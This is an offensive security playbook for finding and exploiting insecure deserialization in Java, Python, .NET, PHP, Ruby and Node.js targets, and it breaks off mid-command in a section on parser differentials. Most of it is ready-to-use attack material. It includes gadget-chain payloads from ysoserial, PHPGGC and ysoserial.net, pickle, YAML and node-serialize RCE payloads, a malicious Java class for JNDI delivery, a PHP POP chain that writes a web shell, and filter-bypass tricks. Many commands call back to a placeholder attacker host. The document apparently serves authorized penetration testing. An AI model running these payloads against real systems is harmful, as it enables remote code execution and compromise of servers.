# Playbook: Insecure Deserialization Testing

## Purpose
Systematically detect and exploit insecure deserialization vulnerabilities
across Java, Python, .NET, PHP, Ruby, and Node.js targets.
Covers identification of serialized data formats, gadget chain exploitation,
blind detection via OOB callbacks, and bypass techniques.
Input: target URL, Burp traffic capture, or specific endpoint handling serialized data.

---

## Step 1 — Setup OOB Callback Infrastructure

Blind deserialization often requires out-of-band confirmation:

```bash
# Option A — Interactsh (preferred)
interactsh-client -v
# Generates unique OAST URL like abc123.oast.fun

# Option B — Burp Collaborator (if you have Pro)
# Use the Collaborator tab in Burp Suite

# Option C — manual listener
ngrok http 8888 &
python3 -m http.server 8888

CALLBACK="abc123.oast.fun"   # Replace with your OOB domain
```

---

## Step 2 — Identify Deserialization Entry Points

### 2a — Magic Bytes and Content-Type Detection

```bash
# Intercept traffic in Burp and look for these signatures:

# Java serialized objects — magic bytes: AC ED 00 05 (hex) or rO0AB (base64)
grep -rlP '\xac\xed\x00\x05' burp_export/ 2>/dev/null
grep -rl 'rO0AB' burp_export/ 2>/dev/null

# Python pickle — magic bytes: \x80\x03 \x80\x04 \x80\x05 (protocol versions)
# Also look for base64-encoded pickle blobs
grep -rlP '\x80[\x03-\x05]' burp_export/ 2>/dev/null

# .NET ViewState — __VIEWSTATE parameter in HTML forms
grep -ri '__VIEWSTATE' burp_export/ 2>/dev/null
grep -ri 'ObjectStateFormatter' burp_export/ 2>/dev/null

# PHP serialized — pattern: O:4:"User":2:{s:4:"name";...}
grep -rE 'O:[0-9]+:"[a-zA-Z]' burp_export/ 2>/dev/null
grep -rE '[aOsib]:[0-9]+[:{]' burp_export/ 2>/dev/null

# Ruby Marshal — magic bytes: \x04\x08
grep -rlP '\x04\x08' burp_export/ 2>/dev/null

# Node.js — look for _$$ND_FUNC$$ in JSON (node-serialize)
grep -rl '_\$\$ND_FUNC\$\$' burp_export/ 2>/dev/null
```

### 2b — Content-Type Headers to Watch

```
Content-Type: application/x-java-serialized-object
Content-Type: application/x-java-object
Content-Type: application/xml (with XMLDecoder)
Content-Type: application/x-www-form-urlencoded (__VIEWSTATE)
Content-Type: application/octet-stream
Transfer-Encoding with binary blobs
```

### 2c — Common Vulnerable Endpoints

```bash
# Java — JMX, RMI, JBoss, WebLogic T3, Jenkins CLI
nmap -sV -p 1099,1100,4848,8080,7001,7002,8443,9990,50000 TARGET

# JBoss — invoker servlet (unauthenticated deserialization)
curl -sk "https://TARGET/invoker/JMXInvokerServlet" -o /dev/null -w "%{http_code}"
curl -sk "https://TARGET/invoker/EJBInvokerServlet" -o /dev/null -w "%{http_code}"
curl -sk "https://TARGET/jbossmq-httpil/HTTPServerILServlet" -o /dev/null -w "%{http_code}"

# WebLogic T3 protocol
python3 -c "
import socket
s = socket.socket()
s.connect(('TARGET', 7001))
s.send(b't3 12.2.1\nAS:255\nHL:19\n\n')
print(s.recv(1024))
s.close()
"

# Jenkins CLI (pre-2.32, pre-2.19.3)
curl -sk "https://TARGET/cli" -o /dev/null -w "%{http_code}"

# Spring Boot Actuator
curl -sk "https://TARGET/actuator" | python3 -m json.tool
curl -sk "https://TARGET/jolokia/"
```

---

## Step 3 — Java Deserialization

### 3a — ysoserial Gadget Chain Generation

```bash
# Install ysoserial
wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar

# Generate payloads for common gadget chains — DNS callback (safe, no RCE)
java -jar ysoserial-all.jar URLDNS "http://${CALLBACK}/java-urldns" > payload_urldns.bin

# RCE payloads — test each chain, target may only have specific libraries
java -jar ysoserial-all.jar CommonsCollections1 "curl http://${CALLBACK}/cc1" > payload_cc1.bin
java -jar ysoserial-all.jar CommonsCollections2 "curl http://${CALLBACK}/cc2" > payload_cc2.bin
java -jar ysoserial-all.jar CommonsCollections3 "curl http://${CALLBACK}/cc3" > payload_cc3.bin
java -jar ysoserial-all.jar CommonsCollections4 "curl http://${CALLBACK}/cc4" > payload_cc4.bin
java -jar ysoserial-all.jar CommonsCollections5 "curl http://${CALLBACK}/cc5" > payload_cc5.bin
java -jar ysoserial-all.jar CommonsCollections6 "curl http://${CALLBACK}/cc6" > payload_cc6.bin
java -jar ysoserial-all.jar CommonsCollections7 "curl http://${CALLBACK}/cc7" > payload_cc7.bin

# Spring-specific chains
java -jar ysoserial-all.jar Spring1 "curl http://${CALLBACK}/spring1" > payload_spring1.bin
java -jar ysoserial-all.jar Spring2 "curl http://${CALLBACK}/spring2" > payload_spring2.bin

# Other common chains
java -jar ysoserial-all.jar BeanShell1 "curl http://${CALLBACK}/bsh" > payload_bsh.bin
java -jar ysoserial-all.jar Groovy1 "curl http://${CALLBACK}/groovy" > payload_groovy.bin
java -jar ysoserial-all.jar Hibernate1 "curl http://${CALLBACK}/hib1" > payload_hib1.bin
java -jar ysoserial-all.jar JRMPClient "TARGET:1099" > payload_jrmp.bin
java -jar ysoserial-all.jar Jdk7u21 "curl http://${CALLBACK}/jdk7" > payload_jdk7.bin
java -jar ysoserial-all.jar MozillaRhino1 "curl http://${CALLBACK}/rhino" > payload_rhino.bin
```

### 3b — Sending Java Payloads

```bash
# Direct POST with serialized object
for payload in payload_*.bin; do
  echo -n "Testing ${payload}: "
  curl -sk "https://TARGET/vulnerable-endpoint" \
    -H "Content-Type: application/x-java-serialized-object" \
    --data-binary @"${payload}" \
    -o /dev/null -w "%{http_code}"
  echo
done

# Base64-encoded in parameter
for payload in payload_*.bin; do
  b64=$(base64 -w0 "${payload}")
  echo -n "Testing ${payload} (b64): "
  curl -sk "https://TARGET/endpoint" \
    -d "data=${b64}" \
    -o /dev/null -w "%{http_code}"
  echo
done

# JBoss invoker servlet
curl -sk "https://TARGET/invoker/JMXInvokerServlet" \
  --data-binary @payload_cc1.bin \
  -H "Content-Type: application/x-java-serialized-object"

# WebLogic T3 — use exploit tool
python3 weblogic_t3_exploit.py -t TARGET -p 7001 -f payload_cc1.bin

# Jenkins CLI — remoting channel
python3 jenkins_deser.py TARGET 50000 payload_cc1.bin
```

### 3c — marshalsec for JNDI/RMI/LDAP Attacks

```bash
# Clone and build marshalsec
git clone https://github.com/mbechler/marshalsec.git
cd marshalsec && mvn clean package -DskipTests

# Start JNDI reference server (for Log4Shell-style and JNDI injection)
# Host malicious class file
cat > ExploitClass.java << 'JAVA'
public class ExploitClass {
    static {
        try {
            Runtime.getRuntime().exec(new String[]{"/bin/bash","-c","curl http://CALLBACK/rce"});
        } catch (Exception e) {}
    }
}
JAVA
javac ExploitClass.java
python3 -m http.server 8888 &

# Start marshalsec LDAP redirector
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar \
  marshalsec.jndi.LDAPRefServer "http://ATTACKER_IP:8888/#ExploitClass" 1389

# Start marshalsec RMI redirector
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar \
  marshalsec.jndi.RMIRefServer "http://ATTACKER_IP:8888/#ExploitClass" 1099

# Trigger via JNDI lookup
# Target receives: ldap://ATTACKER_IP:1389/ExploitClass
```

---

## Step 4 — Python Deserialization

### 4a — Pickle RCE

```python
# Generate malicious pickle payload
import pickle
import base64
import os

class RCE:
    def __reduce__(self):
        return (os.system, (f'curl http://{CALLBACK}/pickle-rce',))

payload = base64.b64encode(pickle.dumps(RCE())).decode()
print(payload)
```

```bash
# Send pickle payload
PICKLE_B64=$(python3 -c "
import pickle, base64, os
class RCE:
    def __reduce__(self):
        return (os.system, ('curl http://${CALLBACK}/pickle-rce',))
print(base64.b64encode(pickle.dumps(RCE())).decode())
")

curl -sk "https://TARGET/api/endpoint" \
  -d "data=${PICKLE_B64}"

# If endpoint accepts raw pickle (Content-Type: application/octet-stream)
python3 -c "
import pickle, os, sys
class RCE:
    def __reduce__(self):
        return (os.system, ('curl http://${CALLBACK}/pickle-raw',))
sys.stdout.buffer.write(pickle.dumps(RCE()))
" | curl -sk "https://TARGET/api/endpoint" \
    -H "Content-Type: application/octet-stream" \
    --data-binary @-
```

### 4b — PyYAML Unsafe Load

```bash
# If target uses yaml.load() without SafeLoader (pre PyYAML 6.0 default)
# Test with YAML payload
curl -sk "https://TARGET/api/config" \
  -H "Content-Type: application/x-yaml" \
  -d '!!python/object/apply:os.system ["curl http://CALLBACK/yaml-rce"]'

# Alternative YAML payloads
cat << 'EOF'
!!python/object/new:os.system ["curl http://CALLBACK/yaml2"]
!!python/object/apply:subprocess.check_output [["curl","http://CALLBACK/yaml3"]]
!!python/object/new:subprocess.check_output [["id"]]
!!python/object/apply:builtins.eval ["__import__('os').system('curl http://CALLBACK/yaml4')"]
EOF
```

### 4c — Shelve Module

```bash
# Python shelve uses pickle internally
# If target reads .db files or shelve data from user input
python3 -c "
import shelve, os
class RCE:
    def __reduce__(self):
        return (os.system, ('curl http://${CALLBACK}/shelve-rce',))
db = shelve.open('malicious')
db['key'] = RCE()
db.close()
"
# Upload malicious.db to target if file upload exists
```

---

## Step 5 — .NET Deserialization

### 5a — ViewState Without MAC Validation

```bash
# Check if ViewState is unprotected (no MAC)
# Decode ViewState from HTML form
VIEWSTATE=$(curl -sk "https://TARGET/page.aspx" | \
  grep -oP '__VIEWSTATE.*?value="[^"]*"' | \
  grep -oP 'value="\K[^"]+')
echo "${VIEWSTATE}" | base64 -d | xxd | head -20

# If no MAC — ViewState is directly deserializable
# Check for __VIEWSTATEGENERATOR and __EVENTVALIDATION
curl -sk "https://TARGET/page.aspx" | \
  grep -E '__(VIEWSTATE|VIEWSTATEGENERATOR|EVENTVALIDATION)'

# If __VIEWSTATEMAC is absent or enableViewStateMac="false" in web.config
# The ViewState can be tampered with
```

### 5b — ysoserial.net

```bash
# Download ysoserial.net (Windows or run via Mono on Linux)
# https://github.com/pwntester/ysoserial.net/releases

# Generate payloads for various .NET formatters
# BinaryFormatter (most common)
ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate \
  -c "cmd /c curl http://${CALLBACK}/dotnet-bf" -o base64

# ObjectStateFormatter (ViewState)
ysoserial.exe -f ObjectStateFormatter -g TypeConfuseDelegate \
  -c "cmd /c curl http://${CALLBACK}/dotnet-osf" -o base64

# LosFormatter (similar to ObjectStateFormatter)
ysoserial.exe -f LosFormatter -g TypeConfuseDelegate \
  -c "cmd /c curl http://${CALLBACK}/dotnet-lf" -o base64

# Common gadget chains for .NET
# TypeConfuseDelegate — works with BinaryFormatter, ObjectStateFormatter
# TextFormattingRunProperties — works with XamlReader
# PSObject — PowerShell based
# WindowsIdentity — Windows auth context

# ViewState exploitation with known machineKey
ysoserial.exe -p ViewState \
  -g TypeConfuseDelegate \
  -c "cmd /c curl http://${CALLBACK}/viewstate-rce" \
  --validationalg="SHA1" \
  --validationkey="VALIDATION_KEY_HERE" \
  --generator="GENERATOR_VALUE" \
  --viewstateuserkey="" \
  --isdebug
```

### 5c — Sending .NET Payloads

```bash
# Replace ViewState in form submission
MALICIOUS_VS=$(ysoserial.exe -f ObjectStateFormatter -g TypeConfuseDelegate \
  -c "cmd /c curl http://${CALLBACK}/vs-rce" -o base64)

curl -sk "https://TARGET/page.aspx" \
  -d "__VIEWSTATE=${MALICIOUS_VS}&__EVENTTARGET=&__EVENTARGUMENT="

# JSON.NET (Newtonsoft.Json) with TypeNameHandling enabled
curl -sk "https://TARGET/api/endpoint" \
  -H "Content-Type: application/json" \
  -d '{
    "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework",
    "MethodName": "Start",
    "MethodParameters": {
      "$type": "System.Collections.ArrayList",
      "$values": ["cmd", "/c curl http://CALLBACK/jsonnet"]
    },
    "ObjectInstance": {
      "$type": "System.Diagnostics.Process, System"
    }
  }'
```

---

## Step 6 — PHP Deserialization

### 6a — unserialize() Exploitation

```bash
# Identify PHP serialized data in cookies, POST params, or headers
# Format: O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:4:"user";}

# Test for type juggling via deserialization
# Change role from "user" to "admin"
curl -sk "https://TARGET/profile" \
  -b 'session=O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:5:"admin";}'

# Property-Oriented Programming (POP) chains
# Exploit __wakeup() or __destruct() magic methods
# Example: file write via __destruct
curl -sk "https://TARGET/endpoint" \
  -d 'data=O:8:"LogClass":2:{s:4:"file";s:14:"/tmp/shell.php";s:4:"data";s:30:"<?php system($_GET["cmd"]); ?>";}'
```

### 6b — PHPGGC (PHP Generic Gadget Chains)

```bash
# Install PHPGGC
git clone https://github.com/ambionics/phpggc.git

# List available gadget chains
./phpggc -l

# Common chains by framework
# Laravel
./phpggc Laravel/RCE1 system "curl http://${CALLBACK}/laravel" -b
./phpggc Laravel/RCE2 system "curl http://${CALLBACK}/laravel2" -b
./phpggc Laravel/RCE5 "system" "curl http://${CALLBACK}/laravel5" -b

# Symfony
./phpggc Symfony/RCE1 "curl http://${CALLBACK}/symfony" -b
./phpggc Symfony/RCE4 exec "curl http://${CALLBACK}/symfony4" -b

# WordPress (Guzzle)
./phpggc Guzzle/RCE1 "curl http://${CALLBACK}/guzzle" -b

# Monolog
./phpggc Monolog/RCE1 system "curl http://${CALLBACK}/monolog" -b

# Doctrine
./phpggc Doctrine/RCE1 system "curl http://${CALLBACK}/doctrine" -b

# Yii
./phpggc Yii/RCE1 "curl http://${CALLBACK}/yii" -b

# Generate URL-encoded for POST parameter
./phpggc Laravel/RCE1 system "curl http://${CALLBACK}/php-rce" -u

# Generate as phar archive
./phpggc Monolog/RCE1 system "curl http://${CALLBACK}/phar-rce" -p phar -o exploit.phar
```

### 6c — Phar Deserialization

```bash
# phar:// stream wrapper triggers deserialization of phar metadata
# Works even when unserialize() is not directly called
# Requires: file operation that accepts user-controlled path with phar:// prefix

# Generate malicious phar
php -r '
$phar = new Phar("exploit.phar");
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>");
$o = new INSERT_GADGET_CLASS_HERE();  // Use PHPGGC-generated object
$phar->setMetadata($o);
$phar->addFromString("test.txt", "test");
$phar->stopBuffering();
'

# Rename to bypass extension filters
cp exploit.phar exploit.jpg
cp exploit.phar exploit.gif
cp exploit.phar exploit.pdf

# Upload the file, then trigger via phar:// in a file operation
# Vulnerable functions: file_exists(), file_get_contents(), fopen(), is_dir(),
# is_file(), is_writable(), filesize(), filetype(), getimagesize(), exif_read_data()

curl -sk "https://TARGET/check-file?path=phar://uploads/exploit.jpg/test.txt"
curl -sk "https://TARGET/image-info?file=phar://uploads/exploit.gif"
```

---

## Step 7 — Ruby Deserialization

### 7a — Marshal.load

```ruby
# Ruby Marshal.load on untrusted data leads to RCE
# Generate malicious Marshal payload

require 'base64'

# Universal Deserialisation Gadget for Ruby (ERB template)
code = "system('curl http://CALLBACK/ruby-rce')"
erb = ERB.allocate
erb.instance_variable_set(:@src, code)
erb.instance_variable_set(:@filename, "x")
erb.instance_variable_set(:@lineno, 0)

depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result)
payload = Base64.encode64(Marshal.dump(depr))
puts payload
```

```bash
# Send marshalled payload
RUBY_PAYLOAD=$(ruby -e '
require "erb"
require "base64"
code = "system(\"curl http://CALLBACK/ruby-marshal\")"
erb = ERB.allocate
erb.instance_variable_set(:@src, code)
erb.instance_variable_set(:@filename, "x")
erb.instance_variable_set(:@lineno, 0)
puts Base64.strict_encode64(Marshal.dump(erb))
')

curl -sk "https://TARGET/endpoint" \
  -d "data=${RUBY_PAYLOAD}"
```

### 7b — YAML.load (Ruby)

```bash
# Ruby YAML.load is unsafe (uses Psych, which can instantiate objects)
# Payloads depend on Ruby version

# Ruby < 2.7
cat << 'EOF'
--- !ruby/object:Gem::Installer
i: x
--- !ruby/object:Gem::SpecFetcher
i: y
--- !ruby/object:Gem::Requirement
requirements:
  !ruby/object:Gem::Package::TarReader
  io: &1 !ruby/object:Net::BufferedIO
    io: &1 !ruby/object:Gem::Package::TarReader::Entry
       read: 0
       header: "abc"
    debug_output: &1 !ruby/object:Net::WriteAdapter
       socket: &1 !ruby/object:Gem::RequestSet
           sets: !ruby/object:Net::WriteAdapter
               socket: !ruby/module 'Kernel'
               method_id: :system
           git_set: "curl http://CALLBACK/yaml-ruby"
       method_id: :resolve
EOF

# Ruby 2.x — simpler payload
cat << 'EOF'
--- !ruby/hash:ActionController::Routing::RouteSet::NamedRouteCollection
? |
  <%
    system("curl http://CALLBACK/ruby-yaml")
  %>
: !ruby/struct
  foo: bar
EOF
```

---

## Step 8 — Node.js Deserialization

### 8a — node-serialize

```bash
# node-serialize uses eval() internally — direct RCE
# Payload uses Immediately Invoked Function Expression (IIFE)

NODE_PAYLOAD='{"rce":"_$$ND_FUNC$$_function(){require(\"child_process\").exec(\"curl http://CALLBACK/node-rce\")}()"}'

curl -sk "https://TARGET/api/endpoint" \
  -H "Content-Type: application/json" \
  -d "${NODE_PAYLOAD}"

# URL-encoded version for cookie injection
NODE_COOKIE=$(python3 -c "import urllib.parse; print(urllib.parse.quote('{\"rce\":\"_\$\$ND_FUNC\$\$_function(){require(\\\\\"child_process\\\\\").exec(\\\\\"curl http://CALLBACK/node-cookie\\\\\")}()\"}'))")

curl -sk "https://TARGET/" \
  -b "session=${NODE_COOKIE}"
```

### 8b — funcster

```bash
# funcster deserializes functions from JSON
# Payload escapes the function sandbox

FUNCSTER_PAYLOAD='{
  "rce": {
    "__js_function": "var f = Buffer.prototype.write; var ft = f.toString(); delete Buffer.prototype.write; var proc = this.constructor.constructor(\"return process\")(); proc.mainModule.require(\"child_process\").execSync(\"curl http://CALLBACK/funcster\").toString()"
  }
}'

curl -sk "https://TARGET/api/endpoint" \
  -H "Content-Type: application/json" \
  -d "${FUNCSTER_PAYLOAD}"
```

---

## Step 9 — Blind Deserialization Detection

When you cannot see output, use these techniques:

### 9a — DNS Callback (Safest)

```bash
# Java — URLDNS chain (no dependency requirements, always works)
java -jar ysoserial-all.jar URLDNS "http://java.${CALLBACK}" > dns_probe.bin

# Send to every suspected endpoint
curl -sk "https://TARGET/endpoint" \
  -H "Content-Type: application/x-java-serialized-object" \
  --data-binary @dns_probe.bin

# Python — DNS via pickle
python3 -c "
import pickle, base64
class DNSProbe:
    def __reduce__(self):
        return (__import__('os').system, ('nslookup python.${CALLBACK}',))
print(base64.b64encode(pickle.dumps(DNSProbe())).decode())
"
```

### 9b — HTTP Callback

```bash
# Each chain gets a unique callback path for identification
# Java
java -jar ysoserial-all.jar CommonsCollections1 \
  "curl http://${CALLBACK}/blind-cc1" > blind_cc1.bin
java -jar ysoserial-all.jar CommonsCollections5 \
  "wget http://${CALLBACK}/blind-cc5" > blind_cc5.bin

# Spray all chains at endpoint
for chain in CommonsCollections{1..7} Spring{1,2} BeanShell1 Groovy1 Hibernate1; do
  java -jar ysoserial-all.jar "${chain}" \
    "curl http://${CALLBACK}/blind-${chain}" 2>/dev/null > "blind_${chain}.bin"
  curl -sk "https://TARGET/endpoint" \
    -H "Content-Type: application/x-java-serialized-object" \
    --data-binary @"blind_${chain}.bin" &
done
wait

# Check interactsh or collaborator for callbacks
# The path tells you which chain worked
```

### 9c — Time-Based Detection

```bash
# Java — sleep-based detection
java -jar ysoserial-all.jar CommonsCollections1 \
  "sleep 10" > time_probe.bin

START=$(date +%s)
curl -sk "https://TARGET/endpoint" \
  --data-binary @time_probe.bin \
  -H "Content-Type: application/x-java-serialized-object" \
  --max-time 30
END=$(date +%s)
ELAPSED=$((END - START))
echo "Response time: ${ELAPSED}s"
# If ~10s → deserialization confirmed

# Python — time-based
python3 -c "
import pickle, base64, time
class TimeBomb:
    def __reduce__(self):
        return (time.sleep, (10,))
print(base64.b64encode(pickle.dumps(TimeBomb())).decode())
"
```

---

## Step 10 — Bypass Techniques

### 10a — Gadget Chain Alternatives

```bash
# If CommonsCollections is blocked, try alternative libraries:
# Gadgets that use different dependencies:

# C3P0 (database connection pooling)
java -jar ysoserial-all.jar C3P0 "http://${CALLBACK}/c3p0"

# ROME (RSS library)
java -jar ysoserial-all.jar ROME "curl http://${CALLBACK}/rome"

# Vaadin (web framework)
java -jar ysoserial-all.jar Vaadin1 "curl http://${CALLBACK}/vaadin"

# Wicket (web framework)
java -jar ysoserial-all.jar Wicket1 "curl http://${CALLBACK}/wicket"

# JBossInterceptors
java -jar ysoserial-all.jar JBossInterceptors1 "curl http://${CALLBACK}/jboss-int"

# Click1
java -jar ysoserial-all.jar Click1 "curl http://${CALLBACK}/click"

# If specific CommonsCollections version is blocked, try others
# CC1 needs CommonsCollections 3.1
# CC2 needs CommonsCollections 4.0
# CC5 needs CommonsCollections 3.1 (different chain)
# CC6 needs CommonsCollections 3.1 (HashSet-based)
```

### 10b — Allowlist / Blocklist Bypass

```bash
# Java — if ObjectInputStream filtering is in place (JEP 290)
# Try chains that use allowed classes

# Bypass via JRMPClient (two-stage: triggers outbound RMI connection)
java -jar ysoserial-all.jar JRMPClient "ATTACKER_IP:1099" > jrmp_client.bin

# Run JRMP listener with actual exploit payload
java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 1099 \
  CommonsCollections6 "curl http://${CALLBACK}/jrmp-bypass"

# Send the JRMPClient payload (small, likely passes filters)
curl -sk "https://TARGET/endpoint" \
  --data-binary @jrmp_client.bin

# PHP — bypass __wakeup with incorrect property count (CVE-2016-7124)
# Change property count to be higher than actual:
# O:4:"Test":2:{...} → O:4:"Test":3:{...}
# This skips __wakeup() and goes straight to __destruct()

# .NET — TypeConfuseDelegate bypass
# If BinaryFormatter is blocked, try:
# - DataContractSerializer with known types
# - NetDataContractSerializer
# - SoapFormatter
# - XmlSerializer with custom types
```

### 10c — Custom Gadget Discovery

```bash
# Java — find exploitable classes in target's classpath
# Use GadgetProbe to identify available libraries
# https://github.com/BishopFox/GadgetProbe

java -jar GadgetProbe.jar -t "https://TARGET/endpoint" \
  -w wordlists/libraries.txt \
  -d "${CALLBACK}"

# Identify which libraries exist on classpath by DNS/HTTP callback
# Then craft targeted chains

# PHP — enumerate available classes
# If you have partial code execution or info disclosure:
curl -sk "https://TARGET/info.php" | grep -i "loaded modules"
# Look for frameworks: Laravel, Symfony, WordPress, Magento, Drupal
# Match to PHPGGC chains
```

---

## Step 11 — Detection Tools Summary

```bash
# Java Deserialization Scanner (Burp extension)
# Install from BApp Store → automatically detects Java serialization points
# Generates and sends ysoserial payloads through Burp

# ysoserial — Java gadget chain generator
# https://github.com/frohoff/ysoserial
java -jar ysoserial-all.jar --help

# ysoserial.net — .NET gadget chain generator
# https://github.com/pwntester/ysoserial.net
ysoserial.exe --help

# PHPGGC — PHP gadget chain generator
# https://github.com/ambionics/phpggc
./phpggc -l

# marshalsec — Java JNDI/RMI/LDAP exploitation
# https://github.com/mbechler/marshalsec

# GadgetProbe — identify remote Java classpaths
# https://github.com/BishopFox/GadgetProbe

# Freddy (Burp extension) — detects deserialization across multiple languages
# Install from BApp Store

# Nuclei templates for deserialization
nuclei -t http/vulnerabilities/ -tags deserialization -u "https://TARGET"
nuclei -t http/vulnerabilities/ -tags java -u "https://TARGET"
nuclei -t network/ -tags deserialization -u "TARGET:7001"

# Custom detection with serialized canaries
# Send known-bad serialized data and look for:
# - ClassNotFoundException in error responses
# - Stack traces mentioning ObjectInputStream
# - Different error for valid vs invalid serialized data
```

---

## Output

```
ENDPOINT      : POST /api/import
PARAMETER     : data (base64-encoded body)
FORMAT        : Java serialized object (AC ED 00 05 / rO0AB prefix)
CHAIN         : CommonsCollections6
TOOL          : ysoserial
RESULT        : RCE CONFIRMED — received HTTP callback at /blind-cc6
                Command execution as user: tomcat
SEVERITY      : CRITICAL
IMPACT        : Full remote code execution on application server
EVIDENCE      : [serialized payload → OOB callback received at timestamp]
BYPASS USED   : None required — no deserialization filtering detected
NEXT STEP     : Load 03_reporting/report_writer.md → report immediately
```

---

## Step 12 — .NET SOAP/WSDL Exploitation (PortSwigger Top 10 2025 #5)

Reference: "SOAPwn: Pwning .NET Framework Apps Through HTTP Client Proxies And WSDL"
by Piotr Bazydlo. This class of vulnerability is UNFIXED in .NET Framework and
affects multiple products that consume SOAP/WSDL services.

### 12a — Understanding the Attack Surface

The core issue lies in `HttpWebClientProtocol` and related classes in
`System.Web.Services`. When a .NET application generates a SOAP client proxy
from a WSDL definition, the generated code trusts the WSDL content implicitly.
An attacker who controls or can manipulate a WSDL endpoint can weaponize this
trust into remote code execution.

Attack chain:
1. Target application fetches a WSDL file from an attacker-controlled or
   MITM'd endpoint
2. Malicious WSDL contains crafted type definitions that abuse .NET
   deserialization during proxy generation
3. The proxy generation process deserializes attacker-controlled data,
   triggering gadget chains leading to RCE

This is not a single CVE — it is an architectural flaw in how .NET Framework
handles WSDL processing and SOAP client proxy generation.

### 12b — Detection: Identifying SOAP/WSDL Targets

```bash
# Scan for .asmx endpoints (ASP.NET Web Services)
ffuf -u "https://TARGET/FUZZ.asmx" \
  -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt \
  -mc 200,403 -o asmx_endpoints.json

# Check known .asmx paths
ASMX_PATHS=(
  "/service.asmx"
  "/webservice.asmx"
  "/api.asmx"
  "/ws.asmx"
  "/services/service.asmx"
  "/soap/service.asmx"
)
for path in "${ASMX_PATHS[@]}"; do
  CODE=$(curl -sk -o /dev/null -w "%{http_code}" "https://TARGET${path}")
  echo "${path} -> ${CODE}"
done

# Retrieve WSDL definitions (append ?wsdl or ?WSDL)
curl -sk "https://TARGET/service.asmx?wsdl" -o service_wsdl.xml
curl -sk "https://TARGET/service.asmx?WSDL" -o service_wsdl2.xml

# Search for SOAP content-type headers in Burp traffic
grep -ri "Content-Type:.*text/xml" burp_export/ 2>/dev/null
grep -ri "Content-Type:.*application/soap" burp_export/ 2>/dev/null
grep -ri "SOAPAction:" burp_export/ 2>/dev/null

# Identify WSDL imports and external references
grep -iE "(schemaLocation|import |include )" service_wsdl.xml

# Nmap service detection for SOAP endpoints
nmap -sV -p 80,443,8080,8443 --script http-wsdl-detect TARGET
```

### 12c — Exploitation Approach

```bash
# Step 1: Identify if the target consumes external WSDL
# Look for server-side WSDL fetching behavior:
# - Configuration files referencing external WSDL URLs
# - Service references in .csproj or web.config
grep -ri "wsdl" burp_export/ 2>/dev/null
grep -ri "<endpoint " burp_export/ 2>/dev/null
grep -ri "basicHttpBinding" burp_export/ 2>/dev/null

# Step 2: Check if target uses .NET Framework (not .NET Core/5+)
# .NET Framework is vulnerable; .NET 5+ has different SOAP handling
# Look for response headers
curl -sk -I "https://TARGET/" | grep -iE "(x-aspnet-version|x-powered-by|server)"
# X-AspNet-Version: 4.0.xxxxx indicates .NET Framework

# Step 3: If you can serve a malicious WSDL to the target
# (via SSRF, DNS rebinding, or MITM on internal services),
# craft a WSDL with malicious type definitions that trigger
# deserialization during wsdl.exe / svcutil.exe proxy generation

# The attack requires the target to:
# a) Fetch WSDL from an attacker-controlled source, OR
# b) Process attacker-supplied WSDL content directly

# This is commonly possible when:
# - The application has an SSRF vulnerability
# - The application imports WSDL from user-supplied URLs
# - Internal services communicate via SOAP without TLS verification
# - Development/staging endpoints allow custom WSDL imports
```

### 12d — Affected Products and Scenarios

```
# Products known to be affected (non-exhaustive):
# - Any .NET Framework application using System.Web.Services
# - Applications generated with wsdl.exe or svcutil.exe
# - SharePoint (SOAP-based service integrations)
# - Exchange Server (EWS and other SOAP endpoints)
# - Custom enterprise .NET applications consuming SOAP services
# - WCF (Windows Communication Foundation) services on .NET Framework

# Key indicators in target:
# - .asmx file extensions
# - ?wsdl query parameter returns XML
# - SOAPAction headers in HTTP requests
# - References to System.Web.Services in error messages
# - WCF endpoints with mex (metadata exchange) enabled
# - /mex or ?singleWsdl endpoints
```

### 12e — Reporting Notes

```
# When reporting this class of vulnerability:
# - Reference Piotr Bazydlo's SOAPwn research
# - Note that this is UNFIXED in .NET Framework
# - Microsoft considers .NET Framework in maintenance mode
# - Mitigation: migrate to .NET 5+ or restrict WSDL source trust
# - Severity depends on whether attacker can control WSDL source
#   - With SSRF chain: CRITICAL (RCE)
#   - Without SSRF: requires MITM or DNS control (HIGH)
# - PortSwigger Top 10 Web Hacking Techniques 2025 ranked this #5
```

---

## Step 13 — Parser Differential Attacks (PortSwigger Top 10 2025 #10)

Parser differentials occur when different parsers interpret the same input
differently, creating security gaps. This is directly relevant to
deserialization because serialized data is often processed by multiple
parsers or the same data format is handled by different libraries across
languages and frameworks.

### 13a — Core Concept

When two components in a system parse the same input using different parsers
(or different versions of the same parser), inconsistencies in interpretation
can lead to security bypasses. In the context of deserialization:

- A WAF or security filter parses serialized data one way (deems it safe)
- The backend application parses the same data differently (executes payload)
- The gap between interpretations is the attack surface

### 13b — Cross-Language Parser Inconsistencies

```bash
# JSON parsers across languages handle edge cases differently:
# - Duplicate keys: which value wins? (first vs last)
# - Number precision: integer overflow handling
# - Unicode escapes: how \uXXXX sequences are normalized
# - Comments: some parsers allow // or /* */ comments
# - Trailing commas: accepted by some, rejected by others
# - NaN/Infinity: valid in some parsers, invalid in others

# Example: duplicate key attack
# If WAF checks first occurrence but backend uses last:
cat << 'JSONEOF'
{
  "$type": "System.String",
  "data": "safe_value",
  "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework",
  "data": "malicious_payload"
}
JSONEOF

# XML parsers differ on:
# - Entity expansion limits
# - Namespace handling
# - CDATA interpretation
# - Processing instruction handling
# - DTD processing (enabled vs disabled)
# - Attribute value normalization

# YAML parsers differ on:
# - Tag handling (!!python/object vs other constructors)
# - Anchors and aliases (recursive reference handling)
# - Merge keys (<<)
# - Version differences between YAML 1.1 and 1.2
```

### 13c — Deserialization-Specific Parser Differentials

```bash
# Scenario 1: WAF uses one JSON library, backend uses another
# Test with edge-case JSON that parses differently across libraries

# Truncated unicode escape
curl -sk "https://TARGET/api/endpoint" \
  -H "Content-Type: application/json" \
  -d '{"key": "\ud800value", "$type": "dangerous.type"}'

# Overlong UTF-8 sequences
python3 -c "
import sys
